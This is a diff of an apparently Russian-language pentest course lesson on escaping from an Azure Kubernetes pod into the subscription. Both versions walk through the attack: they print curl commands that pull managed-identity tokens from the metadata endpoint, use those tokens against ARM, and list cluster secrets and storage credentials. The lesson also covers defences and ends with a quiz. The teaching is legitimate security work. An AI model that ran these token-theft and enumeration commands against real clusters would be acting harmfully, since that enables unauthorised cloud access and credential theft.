@@ -15,179 +15,210 @@ estimated_minutes: 50
 summary: "AKS: managed identity кластера, kubelet identity, Azure AD Workload Identity и IMDS пода. Как из контейнера получить токен Entra ID и эскалировать в подписку."
 ---
 
-## Зачем этот урок
+## Вопрос, с которого всё начинается
 
-Azure Kubernetes Service (AKS) — управляемый Kubernetes в Azure. Как и GKE, он связан с облачной идентичностью: узлы и поды могут получать токены Entra ID через IMDS (169.254.169.254), а **kubelet identity** кластера часто имеет права на другие ресурсы Azure (например, чтение из ACR или управление сетью). Компрометация пода или узла часто приводит к захвату managed identity, а через неё — к доступу в подписку. Azure AD Workload Identity (аналог GKE Workload Identity) изолирует поды, но настраивается не всегда.
+Ты получил выполнение команды в поде внутри Azure Kubernetes Service (AKS). Вроде бы это «всего лишь» контейнер. Но у AKS есть managed identity, а у подов — доступ к metadata Azure. Значит, из контейнера можно получить токен и выйти в подписку. Разберём этот путь.
 
-## Модель AKS и идентичностей
+**AKS** — управляемый Kubernetes в Azure. Kubernetes — оркестратор контейнеров; «под» — минимальная единица запуска (один или несколько контейнеров).
 
-- **Cluster managed identity (control plane)** — используется для управления ресурсами кластера.
-- **Kubelet identity** — отдельная managed identity, которую используют узлы; часто имеет `AcrPull` и права в сети.
-- **Workload Identity** — привязка Kubernetes ServiceAccount (KSA) к managed identity через federated credential. Без неё под использует identity узла.
-- **IMDS** — `http://169.254.169.254/metadata/identity/oauth2/token` с заголовком `Metadata: true`; выдаёт токен для ресурса (`resource=https://management.azure.com/`).
-- **Azure RBAC for Kubernetes** — позволяет управлять доступом к API k8s через Entra ID (роли `Azure Kubernetes Service RBAC Reader/Writer/Admin`).
+## Наш пример: под app-frontend
 
-Проверка изоляции: если токен, полученный подом, принадлежит kubelet identity (`<cluster>-agentpool`), Workload Identity не изолирует под. Если это отдельная managed identity — изоляция работает.
+Объект урока — под `app-frontend-7d9f8`, в который мы попали через уязвимость приложения. Сначала осмотримся.
 
-## Инструменты и команды
+## Шаг 1: попадаем в под и смотрим окружение
 
-```bash
-# Получаем токен из пода
-curl -s -H "Metadata: true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .
-# {"access_token":"eyJ...","client_id":"...","expires_on":"..."}
-
-# Чей это client_id
-curl -s -H "Metadata: true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
-  | jq -r .client_id
-
-# Используем токен против ARM
-TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq '.value[].displayName'
-
-# Управление кластером
-az aks get-credentials --resource-group rg --name aks-prod
-kubectl get nodes -o wide
-az aks show --resource-group rg --name aks-prod --query 'identityProfile'
+```
+$ kubectl exec -it app-frontend-7d9f8 -- sh
+/ # whoami
+nobody
+/ # env | grep -i -E 'azure|identity|tenant'
+IDENTITY_ENDPOINT=http://169.254.169.254/metadata/identity/oauth2/token
+IDENTITY_HEADER=eyJhbGciOi...
+AZURE_CLIENT_ID=c3f1d2e4-...
 ```
 
-## Разобранный пример: от пода к подписке
+Обрати внимание на переменные `IDENTITY_ENDPOINT` и `IDENTITY_HEADER`. Их наличие означает, что у пода включена managed identity (или workload identity). Это наш мостик в Azure.
 
-Сценарий: под в AKS без Workload Identity; IMDS доступен.
+## Шаг 2: что такое managed identity в AKS
 
-```bash
-# 1. Токен для ARM
-TOKEN=$(curl -s -H "Metadata: true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)
+У AKS есть несколько уровней identity:
 
-# 2. Какие подписки видны
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq -r '.value[].subscriptionId'
-# 11111111-2222-3333-4444-555555555555
+- **Cluster identity** — используется самим кластером для управления ресурсами.
+- **Kubelet identity** — от неё работает kubelet (агент на ноде); у неё часто есть доступ к реестру образов и сети.
+- **Pod identity / Workload Identity** — identity, назначенная поду, чтобы он обращался к Azure-ресурсам.
 
-# 3. Что можно делать (list role assignments для identity)
-CLIENT=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .client_id)
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://management.azure.com/subscriptions/11111111-.../providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId eq '$CLIENT'" | jq '.value[].properties.roleDefinitionId'
+Именно последняя нас интересует: если под имеет identity, он может получить токен Azure.
 
-# 4. Если есть Contributor — создаём ресурс/читаем секреты Key Vault
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://management.azure.com/subscriptions/.../resourceGroups?api-version=2021-04-01" | jq -r '.value[].name'
+## Шаг 3: получаем токен
+
+Пробуем metadata-эндпоинт пода:
+
+```
+/ # curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$AZURE_CLIENT_ID"
+{
+  "access_token": "eyJ0eXAiOiJKV1Qi...",
+  "expires_on": "1714580000",
+  "resource": "https://management.azure.com/"
+}
 ```
 
-Kubelet identity часто имеет `Contributor` на node resource group (MC_*), откуда можно читать диски узлов, сети и другие ресурсы. Если у identity есть права на Key Vault — читаем секреты (см. урок про Key Vault).
+Мы получили токен на ARM (API управления Azure). Теперь им можно пользоваться.
 
-## Чек-лист атаки
+## Шаг 4: используем токен
 
-1. Из пода получить токен IMDS; узнать client_id.
-2. Перечислить подписки, resource groups, role assignments.
-3. Проверить kubelet identity (часто в node resource group `MC_*`).
-4. Проверить доступ к ACR, Key Vault, Storage.
-5. Проверить возможность создавать поды с произвольным KSA/managed identity.
-6. Проверить Azure RBAC for Kubernetes: возможно, у вас есть доступ к API k8s через Entra ID.
-7. Проверить CSI-драйверы (Azure Disk/File) — они используют identity для доступа к хранилищу.
+Подставим токен в запрос к ARM и перечислим ресурсы подписки:
 
-## Обход защит и edge cases
-
-- **Workload Identity.** Если включён, токен ограничен federated credential. Но если KSA привязан к широкой identity — эффект тот же. Ищите `serviceAccountName` в манифестах.
-- **Network policy.** Может блокировать IMDS? Обычно нет: IMDS — link-local, не покрывается network policy. Но в некоторых конфигурациях есть ограничения.
-- **Managed identity vs service principal.** Kubelet identity — managed identity; токен выдаётся без секрета. Если используется SP с секретом, секрет может лежать в key vault.
-- **ACR pull.** Kubelet identity часто имеет `AcrPull`; если `AcrPush` — можно отравить образы.
-- **CSI.** Azure Disk/File CSI использует identity для монтирования; может давать доступ к другим томам.
-- **Node SSH.** Если есть доступ к узлу, можно прочитать `/var/lib/kubelet/...` и токены.
-
-## Частые ошибки и подводные камни
-
-- Считать AKS защищённым, потому что «managed».
-- Не проверить kubelet identity: у неё часто Contributor на node RG.
-- Забыть про IMDS: он всегда доступен из пода по умолчанию.
-- Игнорировать ACR как цель (отравление образов).
-- Путать cluster identity и kubelet identity.
-
-## Защита и детект
-
-- Включить Workload Identity и использовать минимальную managed identity на под.
-- Ограничить kubelet identity (не Contributor на весь node RG).
-- Включить Azure Defender for Containers, admission-политики (Azure Policy).
-- Ограничить доступ к IMDS через network policy, где возможно.
-- Включить audit logs AKS и Entra ID sign-in logs; алертить на аномальные вызовы ARM от identity.
-
-## Модель угроз и типовые мисконфиги
-
-Типичный мисконфиг — kubelet identity с Contributor. Второй — отключённый Workload Identity. Третий — KSA, привязанный к широкой identity. Четвёртый — ACR с AcrPush. Пятый — секреты в Key Vault, доступном identity. Все они превращают компрометацию пода в доступ к подписке.
-
-## Практическое задание
-
-1. Создайте AKS-кластер и под; получите токен IMDS и узнайте client_id.
-2. Перечислите role assignments для kubelet identity.
-3. Включите Workload Identity, привяжите KSA к identity с правами только на один RG и повторите.
-4. Настройте Azure Policy и проверьте, что под с произвольной identity блокируется.
-
-## Что дальше / решение
-
-Из пода AKS получаем токен Azure. Дальше — перечислять права, читать Key Vault/Storage, эскалировать. Зафиксируйте путь «под → IMDS → identity → подписка» в графе. При строгом Workload Identity и малых правах — ищите другие поды/identity или эскалируйте внутри кластера.
-
-## Разобранный пример 2: CSI-драйверы и доступ к хранилищу
-
-AKS использует CSI-драйверы (Azure Disk, Azure File) для монтирования томов. Они работают от имени managed identity (kubelet identity или отдельной), и эта identity имеет права на storage-аккаунты и диски. Если у вас есть возможность создавать PVC/PV или читать конфигурацию CSI, вы можете добраться до чужих данных.
-
-```bash
-# Смотрим StorageClass и CSI-драйверы
-kubectl get storageclass
-kubectl get csidrivers
-
-# PersistentVolume и его источник
-kubectl get pv -o json | jq '.items[] | {name:.metadata.name, csi:.spec.csi}'
-# {"name":"pvc-abc","csi":{"driver":"disk.csi.azure.com","volumeHandle":"/subscriptions/.../disks/prod-disk"}}
-
-# Если identity имеет доступ к диску — можно смонтировать его в свой под
-kubectl get secret azure-storage-account-* -o json | jq '.data | keys'
+```
+/ # curl -s -H "Authorization: Bearer eyJ0eXAi..." \
+    "https://management.azure.com/subscriptions?api-version=2020-01-01"
+{"value":[{"id":"/subscriptions/11111111-...","displayName":"Production"}]}
 ```
 
-Azure File CSI монтирует файловые шары через storage-account key или managed identity. Если key лежит в секрете кластера, а у вас есть доступ к секретам namespace — вы получаете доступ к шару. Azure Disk CSI даёт доступ к диску по resource ID: identity с ролью `Contributor` на диск может создать снапшот и выгрузить данные. Проверяйте `kubelet identity` на права к дискам и storage-аккаунтам — это часто забытая ветка.
+Мы видим подписку `Production`. Из контейнера мы дошли до управления облаком. Дальше — читаем секреты из Key Vault, если identity имеет на это права.
+
+## Шаг 5: Workload Identity — современный вариант
+
+Раньше в AKS использовали aad-pod-identity; теперь — **Azure AD Workload Identity**. Под получает федеративный токен, который обменивается на токен Entra ID. Для атакующего разница в деталях: endpoint тот же, но проверять нужно и переменные окружения, и смонтированный токен:
+
+```
+/ # ls /var/run/secrets/azure/tokens/
+azure-identity-token
+```
+
+Наличие этого файла — признак workload identity. Его содержимое обменивается на токен Azure тем же запросом к metadata.
+
+## Шаг 6: kubelet identity и движение по кластеру
+
+Даже без pod identity у kubelet identity часто есть полезные права: `AcrPull` (читать образы из реестра), доступ к сети. А если у нас есть права в Kubernetes (например, через service account пода), можно прочитать **секреты кластера**:
+
+```
+$ kubectl get secrets -A
+NAMESPACE   NAME              TYPE
+default     registry-cred     kubernetes.io/dockerconfigjson
+```
+
+`registry-cred` может содержать креды к реестру образов, а другие секреты — к внешним сервисам. Это отдельный, не облачный, но не менее важный путь.
+
+## Шаг 7: как эскалировать в подписку
+
+Цепочка обычно такая: под → managed identity → ARM/Graph/Key Vault. Масштаб зависит от прав identity. Если identity имеет `Contributor` на подписке — ты управляешь ресурсами; если `User.ReadWrite.All` в Graph — управляешь пользователями. Поэтому после получения токена первым делом читают его `roles`/`scp` и проверяют ресурсы, до которых дотягивается identity.
+
+## Шаг 8: как защищаться
+
+- выдавать подам identity только с нужными правами;
+- использовать Workload Identity и не давать широких ролей kubelet identity;
+- ограничивать RBAC Kubernetes, чтобы секреты не читались свободно;
+- включать аудит доступа к metadata и ARM.
+
+## Шаг 9: практический чек-лист из пода
+
+Попав в под AKS, проверь по порядку:
+
+1. переменные окружения: `env | grep -i identity`;
+2. смонтированные токены: `ls /var/run/secrets/azure/tokens/`;
+3. доступ к metadata: запрос с заголовком `Metadata: true`;
+4. секреты кластера: `kubectl get secrets -A`;
+5. роли identity: перечисление ресурсов через ARM по полученному токену.
+
+Пять шагов занимают минуты и дают полную картину: есть ли выход в Azure и насколько он широк.
+
+## Шаг 10: почему из пода так легко попасть в облако
+
+Pod identity существует именно для того, чтобы под обращался к Azure **без секретов** — через metadata. Значит, эндпоинт открыт по замыслу, и никакого «взлома» для получения токена не нужно: достаточно быть внутри пода. Граница безопасности проходит не по контейнеру, а по **правам identity**. Отсюда практический вывод: если под скомпрометирован, масштаб ущерба определяется исключительно ролью его identity. Поэтому в защите AKS главное — выдавать подам минимальные роли и не давать kubelet identity лишнего.
+
+## Шаг 11: шпаргалка из пода
+
+Запомни три факта: pod identity даёт токен в Azure через metadata; kubelet identity часто имеет доступ к реестру и сети; секреты кластера ведут к внешним сервисам. Проверяя эти три вещи, ты за минуты оценишь, насколько глубоко можно уйти из контейнера.
+
+## Шаг 12: что делать с полученным токеном
+
+Первым делом перечисли ресурсы подписки и проверь Key Vault — это самые ценные цели. Только потом двигайся дальше по кластеру: секреты и сервисные аккаунты могут вести ещё глубже.
+
+## Практический совет
+
+Первым делом проверь переменные окружения пода: если там есть `IDENTITY_ENDPOINT`, путь в Azure открыт. Дальше сразу пробуй получить токен на ARM — это самый прямой способ оценить масштаб.
+
+## Частые вопросы
+
+**«Почему под вообще может ходить в Azure?»** Из-за managed identity: она создана, чтобы под получал доступ без хранения секретов.
+
+**«Что проверять в первую очередь?»** Переменные окружения (`IDENTITY_ENDPOINT`), смонтированный токен и запрос к metadata с заголовком `Metadata: true`.
+
+**«Что такое kubelet identity?»** Identity ноды, от которой работает kubelet; у неё часто есть доступ к реестру образов.
+
+**«Куда идти после получения токена?»** Перечислить ресурсы подписки и проверить Key Vault — там самые ценные данные.
+
+## Что мы теперь знаем
+
+По-простому:
+
+1. AKS — управляемый Kubernetes в Azure.
+2. Под может иметь managed identity и ходить в metadata Azure.
+3. Токен выдаётся с заголовком `Metadata: true` на нужный resource.
+4. Kubelet identity и секреты кластера — дополнительный путь.
+5. Масштаб ущерба определяют права identity.
+
+## На что смотреть дальше
+
+- **Проверяй переменные окружения пода.** `IDENTITY_ENDPOINT` — мостик в Azure.
+- **Ищи смонтированный токен.** Признак Workload Identity.
+- **Читай роли identity.** От них зависит всё.
+- **Смотри секреты кластера.** Они ведут к внешним сервисам.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Чей токен получает под AKS без Workload Identity?"
+- question: "Что такое AKS?"
   options:
-    - "Kubelet/узел managed identity"
-    - "Личный аккаунт пользователя"
-    - "Service principal кластера"
-    - "Токен Key Vault"
+    - "Управляемый Kubernetes в Azure"
+    - "База данных"
+    - "Тип бакета"
+    - "CDN"
   answer: 0
-  explanation: "Без Workload Identity под видит identity узла (kubelet identity)."
-- question: "Через какой эндпоинт под получает токен Entra ID?"
+  explanation: "Azure Kubernetes Service — managed Kubernetes."
+- question: "Что означает переменная IDENTITY_ENDPOINT в поде?"
   options:
-    - "IMDS 169.254.169.254 с заголовком Metadata: true"
-    - "metadata.google.internal"
-    - "169.254.170.2"
-    - "127.0.0.1:8080"
+    - "У пода есть managed identity, доступная через metadata"
+    - "Под выключен"
+    - "Есть SSH"
+    - "Под в другой сети"
   answer: 0
-  explanation: "Azure IMDS выдаёт токены для managed identity."
-- question: "Почему kubelet identity опасна?"
+  explanation: "Через неё получают токен Azure."
+- question: "Какой заголовок нужен при запросе токена у metadata Azure?"
   options:
-    - "Часто имеет Contributor на node resource group (MC_*)"
-    - "Она только для чтения"
-    - "Она не имеет прав"
-    - "Она привязана к пользователю"
+    - "Metadata: true"
+    - "Metadata-Flavor: Google"
+    - "X-aws-token"
+    - "Authorization: Basic"
   answer: 0
-  explanation: "Широкие права kubelet identity дают доступ к ресурсам Azure."
-- question: "Что такое Azure AD Workload Identity?"
+  explanation: "Azure отклоняет запросы без него."
+- question: "Что такое kubelet identity?"
   options:
-    - "Привязка KSA к managed identity через federated credential"
-    - "Публичный бакет"
-    - "Роль ARM"
-    - "Тип диска"
+    - "Identity, от которой работает kubelet ноды"
+    - "Пользователь каталога"
+    - "Тип пода"
+    - "Правило сети"
   answer: 0
-  explanation: "Workload Identity изолирует под, выдавая токен его identity."
+  explanation: "У неё часто есть доступ к реестру образов."
+- question: "От чего зависит масштаб доступа из пода?"
+  options:
+    - "От прав назначенной identity"
+    - "От размера пода"
+    - "От имени кластера"
+    - "От количества нод"
+  answer: 0
+  explanation: "Роль identity определяет доступные ресурсы."
 ```
+
+## Куда дальше
+
+Мы разобрали AKS. Дальше — **Logic Apps**: low-code сервис Azure, где workflow держит managed identity и подключения к сервисам, а инъекции в параметры дают доступ к данным. А пока запомни главное: под в AKS — это потенциальная точка входа в подписку Azure через managed identity.
 
 ## Где пригодится
 
-- **Пентест Azure:** вход в подписку через AKS.
-- **Red team:** lateral movement из кластера.
-- **Cloud IR:** анализ злоупотребления identity.
-- **Сертификация:** AZ-500 / CKS.
+- **Пентест:** путь от контейнера к облаку.
+- **CTF (Cloud):** AKS-задачи с metadata пода.
+- **Red team:** lateral movement из кластера в подписку.
+- **Blue team:** минимизация прав pod identity и kubelet identity.
